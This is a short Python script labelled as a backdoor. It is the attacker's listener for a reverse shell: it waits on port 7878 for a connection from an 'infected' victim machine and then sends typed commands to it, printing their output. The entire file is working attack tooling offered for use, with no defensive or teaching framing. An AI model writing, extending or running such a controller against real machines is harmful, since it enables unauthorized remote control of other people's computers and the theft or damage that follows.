print ("backdoor")
print ("")
print ("backdoor by Cheat")
import socket

port = 7878

def shell():
    current_dir= target.recv(1048).decode()
    while True:
        comando = input("{} > ".format(current_dir))
        if comando == "bye":
            target.send(comando.encode())
            break
        else:
            target.send(comando.encode())
            res = target.recv(4000).decode()
            print (res)


def upserver():
    global server
    global ip
    global target

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0',port))
    server.listen(1)

    print ("server started in %s" % port)
    print ("")
    print ("waiting for connections on the server...")
    target, ip = server.accept()
    print ("received connection from "+str(ip[0])+":"+str(ip[1]))
    print ("")
    print ("Connection Established, victim: "+str(ip[0]))
    print ("MACHINE infected")
    print ("Type 'bye' to leave")

upserver()
shell()
server.close()
